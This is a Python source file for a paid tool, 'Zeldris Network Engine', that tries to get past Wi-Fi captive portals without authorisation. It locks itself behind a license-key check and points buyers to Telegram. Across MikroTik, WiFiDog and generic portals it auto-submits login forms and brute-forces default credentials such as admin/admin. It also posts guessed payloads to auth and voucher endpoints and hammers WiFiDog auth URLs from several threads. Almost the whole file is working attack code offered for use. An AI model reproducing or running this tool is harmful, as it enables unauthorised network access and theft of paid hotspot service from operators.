#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Zeldris Network Engine v7.0 – Ultra Bypass Edition
Portal Detection • MikroTik • WiFiDog • Generic • Voucher • Full Arsenal
"""
import requests
import re
import urllib3
import time
import threading
import random
import os
import sys
import subprocess
import importlib.util
import socket
import struct
import json
from urllib.parse import urlparse, parse_qs, urljoin

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ===============================
# COLOR SYSTEM
# ===============================
black = "\033[0;30m"
red = "\033[0;31m"
bred = "\033[1;31m"
green = "\033[0;32m"
bgreen = "\033[1;32m"
yellow = "\033[0;33m"
byellow = "\033[1;33m"
blue = "\033[0;34m"
bblue = "\033[1;34m"
purple = "\033[0;35m"
bpurple = "\033[1;35m"
cyan = "\033[0;36m"
bcyan = "\033[1;36m"
white = "\033[0;37m"
reset = "\033[00m"

# ===============================
# KEY APPROVAL SYSTEM
# ===============================
SHEET_ID = "1SfizOga-9kZKvgcDvTMr6NLuZyq9J2PbLruRMaOYX44"
SHEET_CSV_URL = f"https://docs.google.com/spreadsheets/d/{SHEET_ID}/export?format=csv&gid=0"
LOCAL_KEYS_FILE = os.path.expanduser("~/.zel_approved_keys.txt")

def get_system_key():
    try:
        uid = os.geteuid()
    except AttributeError:
        uid = 1000
    try:
        username = os.getlogin()
    except:
        username = os.environ.get('USER', 'unknown')
    return f"{uid}{username}"

def fetch_authorized_keys():
    keys = []
    try:
        response = requests.get(SHEET_CSV_URL, timeout=10)
        if response.status_code == 200:
            for line in response.text.strip().split('\n'):
                line = line.strip()
                if line and not line.startswith('username') and not line.startswith('key'):
                    key = line.split(',')[0].strip().strip('"')
                    if key:
                        keys.append(key)
            if keys:
                try:
                    with open(LOCAL_KEYS_FILE, 'w') as f:
                        f.write('\n'.join(keys))
                except:
                    pass
            return keys
    except:
        pass
    try:
        if os.path.exists(LOCAL_KEYS_FILE):
            with open(LOCAL_KEYS_FILE, 'r') as f:
                keys = [line.strip() for line in f if line.strip()]
            return keys
    except:
        pass
    return keys

def check_approval():
    os.system('clear' if os.name == 'posix' else 'cls')
    print(f"{bcyan}╔══════════════════════════════════════════════════════════════════╗")
    print(f"║                    ZELDRIS KEY APPROVAL SYSTEM                       ║")
    print(f"╚══════════════════════════════════════════════════════════════════╝{reset}")
    print(f"\n{bcyan}[!] Checking approval status...{reset}")
    system_key = get_system_key()
    authorized_keys = fetch_authorized_keys()
    print(f"{white}[*] System Key: {system_key}{reset}")
    print(f"{white}[*] Authorized Keys: {len(authorized_keys)}{reset}")
    if system_key in authorized_keys:
        print(f"\n{bgreen}╔══════════════════════════════════════════════════════════════════╗")
        print(f"║                    ✓ KEY APPROVED ✓                                 ║")
        print(f"║                    Zeldris Engine Unlocked                           ║")
        print(f"╚══════════════════════════════════════════════════════════════════╝{reset}")
        time.sleep(1.5)
        return True
    else:
        print(f"\n{bred}╔══════════════════════════════════════════════════════════════════╗")
        print(f"║                    ❌ KEY NOT APPROVED ❌                           ║")
        print(f"╠══════════════════════════════════════════════════════════════════╣")
        print(f"║                                                                  ║")
        print(f"║  {yellow}To buy this tool, contact:{reset}                                 ║")
        print(f"║                                                                  ║")
        print(f"║     {bcyan}📱 Telegram:{reset}  @Zeldris                                      ║")
        print(f"║     {bcyan}📢 Channel:{reset}  t.me/zelwithz                                 ║")
        print(f"║                                                                  ║")
        print(f"║  {yellow}Your Key: {system_key}{reset}                                             ║")
        print(f"║  {yellow}Send this key to buy the tool{reset}                                        ║")
        print(f"║                                                                  ║")
        print(f"╚══════════════════════════════════════════════════════════════════╝{reset}")
        return False

# ===============================
# BANNER DISPLAY (Zeldris themed)
# ===============================
def display_banner():
    banner_text = f"""
{bred}┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓{reset}
{bred}┃                                                ┃{reset}
{bred}┃{bgreen}      ⣠⣴⣶⣿⣿⠿⣷⣶⣤⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣴⣶⣷⠿⣿⣿⣶⣦⣀⠀⠀⠀⠀⠀ {bred}┃{reset}
{bred}┃{bgreen} ⠀⠀⠀⢀⣾⣿⣿⣿⣿⣿⣿⣿⣶⣦⣬⡉⠒⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠚⢉⣥⣴⣾⣿⣿⣿⣿⣿⣿⣿⣧⠀⠀⠀⠀ {bred}┃{reset}
{bred}┃{bgreen} ⠀⠀⠀⡾⠿⠛⠛⠛⠛⠿⢿⣿⣿⣿⣿⣿⣷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣾⣿⣿⣿⣿⣿⠿⠿⠛⠛⠛⠛⠿⢧⠀⠀⠀ {bred}┃{reset}
{bred}┃{bgreen} ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠻⣿⣿⣿⣿⣿⡄⠀⠀⠀⠀⠀⠀⣠⣿⣿⣿⣿⡿⠟⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ {bred}┃{reset}
{bred}┃{bgreen} ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⢰⣿⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ {bred}┃{reset}
{bred}┃{bgreen} ⠀⠀⠀⠀⠀⠀⠀⣠⣤⠶⠶⠶⠰⠦⣤⣀⠀⠙⣷⠀⠀⠀⠀⠀⠀⠀⢠⡿⠋⢀⣀⣤⢴⠆⠲⠶⠶⣤⣄⠀⠀⠀⠀⠀⠀⠀ {bred}┃{reset}
{bred}┃{bgreen} ⠀⠘⣆⠀⠀⢠⣾⣫⣶⣾⣿⣿⣿⣿⣷⣯⣿⣦⠈⠃⡇⠀⠀⠀⠀⢸⠘⢁⣶⣿⣵⣾⣿⣿⣿⣿⣷⣦⣝⣷⡄⠀⠀⡰⠂⠀ {bred}┃{reset}
{bred}┃{bgreen} ⠀⠀⣨⣷⣶⣿⣧⣛⣛⠿⠿⣿⢿⣿⣿⣛⣿⡿⠀⠀⡇⠀⠀⠀⠀⢸⠀⠈⢿⣟⣛⠿⢿⡿⢿⢿⢿⣛⣫⣼⡿⣶⣾⣅⡀⠀ {bred}┃{reset}
{bred}┃{bgreen} ⢀⡼⠋⠁⠀⠀⠈⠉⠛⠛⠻⠟⠸⠛⠋⠉⠁⠀⠀⢸⡇⠀⠀⠄⠀⢸⡄⠀⠀⠈⠉⠙⠛⠃⠻⠛⠛⠛⠉⠁⠀⠀⠈⠙⢧⡀ {bred}┃{reset}
{bred}┃{bgreen} ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⡇⢠⠀⠀⠀⢸⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ {bred}┃{reset}
{bred}┃{bgreen} ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⣿⡇⠀⠀⠀⠀⢸⣿⣷⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ {bred}┃{reset}
{bred}┃{bgreen} ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⠟⠁⣿⠇⠀⠀⠀⠀⢸⡇⠙⢿⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ {bred}┃{reset}
{bred}┃{bgreen} ⠀⠰⣄⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣾⠖⡾⠁⠀⠀⣿⠀⠀⠀⠀⠀⠘⣿⠀⠀⠙⡇⢸⣷⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⣰⠄⠀ {bred}┃{reset}
{bred}┃{bgreen} ⠀⠀⢻⣷⡦⣤⣤⣤⡴⠶⠿⠛⠉⠁⠀⢳⠀⢠⡀⢿⣀⠀⠀⠀⠀⣠⡟⢀⣀⢠⠇⠀⠈⠙⠛⠷⠶⢦⣤⣤⣤⢴⣾⡏⠀⠀ {bred}┃{reset}
{bred}┃{bgreen}  ⠀⠈⣿⣧⠙⣿⣷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠘⠛⢊⣙⠛⠒⠒⢛⣋⡚⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀⣠⣿⡿⠁⣾⡿⠀⠀⠀ {bred}┃{reset}
{bred}┃{bgreen}⠀ ⠀⠀⠘⣿⣇⠈⢿⣿⣦⠀⠀⠀⠀⠀⠀⠀⠀⣰⣿⣿⣿⡿⢿⣿⣿⣿⣆⠀⠀⠀⠀⠀⠀⠀⢀⣼⣿⡟⠁⣼⡿⠁⠀⠀⠀ {bred}┃{reset}
{bred}┃{bgreen}⠀⠀ ⠀⠀⠘⣿⣦⠀⠻⣿⣷⣦⣤⣤⣶⣶⣶⣿⣿⣿⣿⠏⠀⠀⠻⣿⣿⣿⣿⣶⣶⣶⣦⣤⣴⣿⣿⠏⢀⣼⡿⠁⠀⠀⠀⠀ {bred}┃{reset}
{bred}┃{bgreen}⠀⠀⠀ ⠀⠀⠘⢿⣷⣄⠙⠻⠿⠿⠿⠿⠿⢿⣿⣿⣿⣁⣀⣀⣀⣀⣙⣿⣿⣿⠿⠿⠿⠿⠿⠿⠟⠁⣠⣿⡿⠁⠀⠀⠀⠀⠀ {bred}┃{reset}
{bred}┃{bgreen}⠀⠀⠀⠀ ⠀⠀⠈⠻⣯⠙⢦⣀⠀⠀⠀⠀⠀⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠀⠀⠀⠀⠀⣠⠴⢋⣾⠟⠀⠀⠀⠀⠀⠀⠀ {bred}┃{reset}
{bred}┃{bgreen}⠀⠀⠀⠀⠀ ⠀⠀⠀⠙⢧⡀⠈⠉⠒⠀⠀⠀⠀⠀⠀⣀⠀⠀⠀⠀⢀⠀⠀⠀⠀⠀⠐⠒⠉⠁⢀⡾⠃⠀⠀⠀⠀⠀⠀⠀⠀ {bred}┃{reset}
{bred}┃{bgreen}⠀⠀⠀⠀⠀⠀ ⠀⠀⠀⠈⠳⣄⠀⠀⠀⠀⠀⠀⠀⠀⠻⣿⣿⣿⣿⠋⠀⠀⠀⠀⠀⠀⠀⠀⣠⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ {bred}┃{reset}
{bred}┃{bgreen}⠀⠀⠀⠀⠀⠀⠀ ⠀⠀⠀⠀⠘⢦⡀⠀⠀⠀⠀⠀⠀⠀⣸⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⢀⡴⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ {bred}┃{reset}
{bred}┃{bgreen}⠀⠀⠀⠀⠀⠀⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ {bred}┃{reset}
{bred}┃{bgreen}⠀⠀⠀⠀⠀⠀⠀⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ {bred}┃{reset}
{bred}┃{bgreen}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ {bred}┃{reset}
{bred}┃{bgreen}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ {bred}┃{reset}
{bred}┃{bgreen}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣿⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ {bred}┃{reset}
{bred}┃                                                ┃{reset}
{bred}┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛{reset}
"""
    print(banner_text)
    time.sleep(1.5)

# ===============================
# AUTO INSTALLER
# ===============================
def auto_install_dependencies():
    required = ['requests', 'urllib3']
    missing = []
    print(f"{bcyan}[*] Checking dependencies...{reset}")
    for pkg in required:
        if importlib.util.find_spec(pkg) is None:
            missing.append(pkg)
    if missing:
        print(f"{yellow}[!] Missing: {', '.join(missing)}{reset}")
        print(f"{bcyan}[*] Installing...{reset}")
        for pkg in missing:
            try:
                subprocess.check_call([sys.executable, '-m', 'pip', 'install', pkg, '--quiet'])
                print(f"{green}[✓] {pkg}{reset}")
            except Exception as e:
                print(f"{red}[X] {pkg}: {e}{reset}")
        print(f"{green}[✓] Done.{reset}")
        time.sleep(1)
    else:
        print(f"{green}[✓] All dependencies already installed!{reset}")
        time.sleep(0.5)

# ===============================
# GLOBAL CONFIG
# ===============================
PING_THREADS = 5
MIN_INTERVAL = 0.05
MAX_INTERVAL = 0.2
stop_event = threading.Event()

# ===============================
# CORRECT INTERNET CHECK
# ===============================
def check_real_internet():
    """True internet detection – NOT fooled by captive portals."""
    try:
        r = requests.get("http://connectivitycheck.gstatic.com/generate_204",
                         allow_redirects=False, timeout=5)
        return r.status_code == 204 and 'Location' not in r.headers
    except:
        return False

# ===============================
# ULTRA PORTAL DETECTION
# ===============================
def get_default_gateway():
    """Try to get the default gateway IP via `ip route` or `netstat`."""
    try:
        import subprocess
        # Linux/Mac
        result = subprocess.run(['ip', 'route', 'show', 'default'], capture_output=True, text=True).stdout
        m = re.search(r'via\s+(\d+\.\d+\.\d+\.\d+)', result)
        if m:
            return m.group(1)
    except:
        pass
    try:
        # Alternative for Mac
        result = subprocess.run(['route', '-n', 'get', 'default'], capture_output=True, text=True).stdout
        m = re.search(r'gateway:\s+(\d+\.\d+\.\d+\.\d+)', result)
        if m:
            return m.group(1)
    except:
        pass
    return None

def get_portal_url():
    """Multiple methods to detect the captive portal URL."""
    test_urls = [
        "http://connectivitycheck.gstatic.com/generate_204",
        "http://captive.apple.com/hotspot-detect.html",
        "http://www.msftconnecttest.com/redirect",
        "http://detectportal.firefox.com/canonical.html",
        "http://1.1.1.1",  # Cloudflare, if redirected, portal
        "http://8.8.8.8",  # Google DNS
        "http://neverssl.com"  # HTTP site, often redirected
    ]
    for url in test_urls:
        try:
            r = requests.get(url, allow_redirects=True, timeout=5)
            if r.url != url and 'generate_204' not in r.url and 'hotspot-detect' not in r.url:
                return r.url
        except:
            continue

    # Try to fetch default gateway IP directly
    gw = get_default_gateway()
    if gw:
        for proto in ['http', 'https']:
            try:
                r = requests.get(f"{proto}://{gw}", allow_redirects=True, timeout=3)
                if r.status_code in (200, 302):
                    return r.url
            except:
                pass

    # DNS test: resolve a known domain; if redirected, might be portal
    try:
        ip = socket.gethostbyname("detectportal.firefox.com")
        # If the IP is not the real one (i.e., captive portal's IP), it's hijacked
        if not (ip == "104.18.31.245" or ip.startswith("172.") or ip.startswith("10.")):
            # Possibly redirected, try to access that IP
            r = requests.get(f"http://{ip}", timeout=3, allow_redirects=True)
            if r.url != f"http://{ip}":
                return r.url
    except:
        pass

    return None

# ===============================
# SESSION PREPARATION
# ===============================
def create_session():
    s = requests.Session()
    s.headers.update({
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"
    })
    return s

# ===============================
# BYPASS TECHNIQUES (Ultra)
# ===============================
def ultra_bypass(session, portal_url):
    print(f"{yellow}[*] Launching ULTRA BYPASS attack...{reset}")
    base = portal_url
    methods = []

    # Prepare a list of functions to run (some concurrent)
    def try_click_links():
        try:
            r = session.get(portal_url, timeout=10, allow_redirects=True)
            html = r.text
            keywords = ['connect', 'agree', 'login', 'accept', 'continue', 'free', 'click']
            for kw in keywords:
                match = re.search(r'href="([^"]+)"[^>]*>\s*' + re.escape(kw) + r'\s*<', html, re.IGNORECASE)
                if match:
                    link = urljoin(base, match.group(1))
                    session.get(link, timeout=10)
                    time.sleep(2)
                    if check_real_internet():
                        return True
        except:
            pass
        return False

    def try_form_submit():
        try:
            r = session.get(portal_url, timeout=10)
            html = r.text
            forms = re.findall(r'<form[^>]*>.*?</form>', html, re.DOTALL | re.IGNORECASE)
            for fhtml in forms:
                action_m = re.search(r'action="([^"]+)"', fhtml, re.IGNORECASE)
                action = urljoin(base, action_m.group(1)) if action_m else base
                data = {}
                for inp in re.findall(r'<input[^>]+>', fhtml, re.IGNORECASE):
                    nm = re.search(r'name="([^"]+)"', inp)
                    vm = re.search(r'value="([^"]*)"', inp)
                    if nm:
                        data[nm.group(1)] = vm.group(1) if vm else ""
                # Add common values
                if 'username' in data: data['username'] = 'guest'
                if 'password' in data: data['password'] = 'guest'
                if 'dst' in data: data['dst'] = 'http://www.google.com/'
                if 'redir' in data: data['redir'] = 'http://www.google.com/'
                # Submit
                session.post(action, data=data, timeout=10)
                time.sleep(2)
                if check_real_internet():
                    return True
        except:
            pass
        return False

    def try_common_credentials():
        creds = [('admin','admin'),('admin','password'),('guest','guest'),('','')]
        try:
            r = session.get(portal_url, timeout=10)
            html = r.text
            forms = re.findall(r'<form[^>]*>.*?</form>', html, re.DOTALL | re.IGNORECASE)
            for fhtml in forms:
                action_m = re.search(r'action="([^"]+)"', fhtml, re.IGNORECASE)
                action = urljoin(base, action_m.group(1)) if action_m else base
                if 'username' in fhtml and 'password' in fhtml:
                    for user, pwd in creds:
                        data = {}
                        for inp in re.findall(r'<input[^>]+>', fhtml, re.IGNORECASE):
                            nm = re.search(r'name="([^"]+)"', inp)
                            vm = re.search(r'value="([^"]*)"', inp)
                            if nm:
                                data[nm.group(1)] = vm.group(1) if vm else ""
                        data['username'] = user
                        data['password'] = pwd
                        session.post(action, data=data, timeout=10)
                        time.sleep(1)
                        if check_real_internet():
                            return True
        except:
            pass
        return False

    def try_post_to_endpoints():
        endpoints = ['/', '/login', '/connect', '/auth', '/signin', '/hotspotlogin', '/api/auth/voucher/']
        payload_variants = [
            {'button': 'Connect', 'redir': 'http://www.google.com/'},
            {'accept': 'yes'},
            {'connect': 'Connect'},
            {'redirect': ''},
            {'dst': 'http://www.google.com/'},
            {'voucher': '', 'sessionId': '', 'id': ''}
        ]
        for ep in endpoints:
            url = urljoin(base, ep)
            for data in payload_variants:
                try:
                    session.post(url, data=data, timeout=5)
                    time.sleep(1)
                    if check_real_internet():
                        return True
                except:
                    continue
        return False

    def try_user_agent_rotation():
        agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
            "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.165 Mobile Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
        ]
        for ua in agents:
            session.headers.update({"User-Agent": ua})
            try:
                r = session.get(portal_url, timeout=10)
                if check_real_internet():
                    return True
                # Also poke the portal
                time.sleep(1)
            except:
                continue
        return False

    def try_cookie_injection():
        # Some portals set a cookie on first visit and then let you through on second.
        session.cookies.clear()
        try:
            session.get(portal_url, timeout=10)
            time.sleep(2)
            session.get(portal_url, timeout=10)
            if check_real_internet():
                return True
        except:
            pass
        return False

    # Run all methods sequentially, but fast
    methods = [
        try_click_links,
        try_form_submit,
        try_common_credentials,
        try_post_to_endpoints,
        try_user_agent_rotation,
        try_cookie_injection,
    ]

    for method in methods:
        print(f"{cyan}[*] Trying {method.__name__}...{reset}")
        if method():
            return True

    # Last resort: request portal with different headers Accept, Referer
    try:
        session.headers.update({"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
                                "Referer": "http://www.google.com/"})
        session.get(portal_url, timeout=10)
        time.sleep(2)
        if check_real_internet():
            return True
    except:
        pass

    return False

# ===============================
# MIKROTIK AUTH (preserved)
# ===============================
def mikrotik_auth(session, portal_url, sid):
    try:
        print(f"{cyan}[*] MikroTik hotspot — attempting form login...{reset}")
        r = session.get(portal_url, verify=False, timeout=10)
        action_m = re.search(r'action="([^"]+)"', r.text, re.IGNORECASE)
        action = urljoin(portal_url, action_m.group(1)) if action_m else urljoin(portal_url, '/login')
        data = {}
        for inp in re.findall(r'<input[^>]+>', r.text, re.IGNORECASE):
            name_m = re.search(r'name="([^"]+)"', inp)
            val_m = re.search(r'value="([^"]*)"', inp)
            if name_m:
                data[name_m.group(1)] = val_m.group(1) if val_m else ""
        data.setdefault('dst', '')
        data.setdefault('username', '')
        data.setdefault('password', '')
        if 'id' in data:
            data['id'] = sid
        elif 'sid' in data:
            data['sid'] = sid
        else:
            data['id'] = sid
        print(f"{green}[✓]{reset} Posting to {action}")
        resp = session.post(action, data=data, verify=False, timeout=10)
        if resp.status_code in (200, 302, 303):
            time.sleep(2)
            if check_real_internet():
                print(f"{bgreen}[✓] MikroTik login successful!{reset}")
                return True
        return False
    except Exception as e:
        print(f"{red}[X] MikroTik error: {e}{reset}")
        return False

# ===============================
# WIFIDOG AUTH (preserved)
# ===============================
def wifidog_auth(session, sid, gw_addr, gw_port):
    auth_link = f"http://{gw_addr}:{gw_port}/wifidog/auth?token={sid}&phonenumber=12345"
    print(f"{purple}[*] WiFiDog mode — launching {PING_THREADS} threads...{reset}")
    def ping_worker():
        cnt, ok = 0, 0
        while not stop_event.is_set():
            try:
                t0 = time.time()
                session.get(auth_link, timeout=5)
                ms = (time.time() - t0)*1000
                cnt += 1
                ok += 1
                col = green if ms < 50 else (yellow if ms < 100 else red)
                print(f"{col}[✓]{reset} SID {sid[:8]} | {ms:.1f}ms | {ok}/{cnt}", end="\r")
            except:
                cnt += 1
                print(f"{red}[X]{reset} SID {sid[:8]} | Failed | {ok}/{cnt}", end="\r")
            time.sleep(random.uniform(MIN_INTERVAL, MAX_INTERVAL))
    for _ in range(PING_THREADS):
        threading.Thread(target=ping_worker, daemon=True).start()
    last = False
    while not stop_event.is_set():
        online = check_real_internet()
        if online and not last:
            print(f"\n{green}[✓] Internet Connected!{reset}")
        elif not online and last:
            print(f"\n{red}[X] Internet Disconnected!{reset}")
        last = online
        time.sleep(2)

# ===============================
# MAIN ENGINE (Always run)
# ===============================
def start_zeldris_engine():
    stop_event.clear()
    os.system('clear' if os.name == 'posix' else 'cls')
    display_banner()
    print(f"{bcyan}╔══════════════════════════════════════════════════════════════════╗")
    print(f"║                    ZELDRIS NETWORK ENGINE v7.0                      ║")
    print(f"║                    Ultra Bypass Edition                             ║")
    print(f"╚══════════════════════════════════════════════════════════════════╝{reset}\n")
    print(f"{yellow}[!] Engine will run continuously until Ctrl+C.{reset}\n")

    while not stop_event.is_set():
        print(f"{cyan}[*] Ultra‑detecting portal...{reset}")
        portal_url = get_portal_url()
        if portal_url:
            print(f"{green}[✓]{reset} Portal found: {portal_url}")
            session = create_session()
            # Determine type
            try:
                r = session.get(portal_url, verify=False, timeout=10)
                html = r.text
            except:
                html = ""
            ptype = 'generic'
            if re.search(r'mikrotik|/login', html, re.IGNORECASE):
                ptype = 'mikrotik'
            elif re.search(r'wifidog', html, re.IGNORECASE):
                ptype = 'wifidog'
            print(f"{bcyan}[*] Portal type: {ptype.upper()}{reset}")
            sid = extract_session_id(portal_url, html)

            if ptype == 'mikrotik':
                if not mikrotik_auth(session, portal_url, sid):
                    ultra_bypass(session, portal_url)
            elif ptype == 'wifidog':
                parsed = urlparse(portal_url)
                qs = parse_qs(parsed.query)
                gw_addr = qs.get('gw_address', ['192.168.60.1'])[0]
                gw_port = qs.get('gw_port', ['2060'])[0]
                wifidog_auth(session, sid, gw_addr, gw_port)
            else:
                ultra_bypass(session, portal_url)

            # Monitor for a while, then re-scan if lost
            for _ in range(12):
                if stop_event.is_set(): break
                if not check_real_internet():
                    print(f"{red}[X] Connection lost.{reset}")
                    break
                time.sleep(5)
        else:
            print(f"{yellow}[•]{reset} No portal found – retrying in 5s...")
            time.sleep(5)

    print(f"\n{red}Zeldris Engine stopped.{reset}")

def extract_session_id(url, html):
    qs = parse_qs(urlparse(url).query)
    sid = qs.get('sessionId', [None])[0] or qs.get('id', [None])[0]
    if sid: return sid
    patterns = [r'sessionId=([a-zA-Z0-9]+)', r'"sid":"([^"]+)"',
                r'name="sessionid"\s+value="([^"]+)"', r'"sessionid":"([^"]+)"']
    for pat in patterns:
        m = re.search(pat, html, re.IGNORECASE)
        if m: return m.group(1)
    return None

# ===============================
# MANUAL MODE
# ===============================
def manual_mode():
    print(f"\n{bcyan}[*] Manual Bypass Mode{reset}")
    url = input(f"{bcyan}[?]{reset} Auth URL: ").strip()
    if not url:
        print(f"{red}[!] No URL. Aborted.{reset}")
        return
    method = input(f"{bcyan}[?]{reset} Method (GET/POST, default GET): ").strip().upper() or "GET"
    params = {}
    print(f"{yellow}Enter key=value (empty to finish):{reset}")
    while True:
        line = input().strip()
        if not line: break
        if '=' in line:
            k, v = line.split('=', 1)
            params[k.strip()] = v.strip()
    try:
        if method == 'POST':
            resp = requests.post(url, data=params, timeout=10)
        else:
            resp = requests.get(url, params=params, timeout=10)
        print(f"{green}[✓]{reset} Status: {resp.status_code}")
        time.sleep(2)
        if check_real_internet():
            print(f"{bgreen}[✓] Internet is now active!{reset}")
        else:
            print(f"{yellow}[!] Not yet online.{reset}")
    except Exception as e:
        print(f"{red}[X] Request failed: {e}{reset}")

# ===============================
# MENU (Zeldris themed)
# ===============================
def show_menu():
    os.system('clear' if os.name == 'posix' else 'cls')
    display_banner()
    print(f"""
{bcyan}╔══════════════════════════════════════════════════════════════════╗
║                         ZELDRIS MAIN MENU                            ║
╠══════════════════════════════════════════════════════════════════════╣
║                                                                      ║
║     {bgreen}[1]{reset} {cyan}Zeldris Hack{reset} (Always‑Run Ultra Bypass)                             ║
║     {bgreen}[2]{reset} {cyan}Manual Bypass{reset} (Custom URL & Parameters)                          ║
║     {bred}[3]{reset} {cyan}Exit{reset}                                                         ║
║                                                                      ║
╚══════════════════════════════════════════════════════════════════════╝
    """)
    while True:
        try:
            choice = input(f"{bcyan}[?]{reset} Select option [1-3]: ").strip()
            if choice == '1':
                return 'hack'
            elif choice == '2':
                return 'manual'
            elif choice == '3':
                return 'exit'
            else:
                print(f"{red}[!] Invalid option!{reset}")
        except KeyboardInterrupt:
            return 'exit'

# ===============================
# MAIN
# ===============================
def main():
    if not check_approval():
        sys.exit(1)
    print(f"\n{bcyan}[*] Running auto-installer...{reset}")
    auto_install_dependencies()
    while True:
        choice = show_menu()
        if choice == 'hack':
            try:
                start_zeldris_engine()
            except KeyboardInterrupt:
                stop_event.set()
                print(f"\n{red}Engine stopped.{reset}")
                input("Press Enter to return to menu...")
                continue
        elif choice == 'manual':
            manual_mode()
            input(f"\n{yellow}Press Enter to return to menu...{reset}")
            continue
        elif choice == 'exit':
            print(f"\n{green}[✓] Thank you for using Zeldris Network Engine!{reset}")
            print(f"{cyan}Visit: t.me/Zeldris for updates{reset}\n")
            sys.exit(0)

if __name__ == "__main__":
    if len(sys.argv) > 1 and sys.argv[1] == "--key":
        print(f"\n{green}Your System Key: {get_system_key()}{reset}")
        print(f"{yellow}Send this key to @Zeldris to purchase{reset}")
        sys.exit(0)
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{red}Program terminated by user{reset}")
        sys.exit(0)
    except Exception as e:
        print(f"{red}Fatal Error: {e}{reset}")
        sys.exit(1)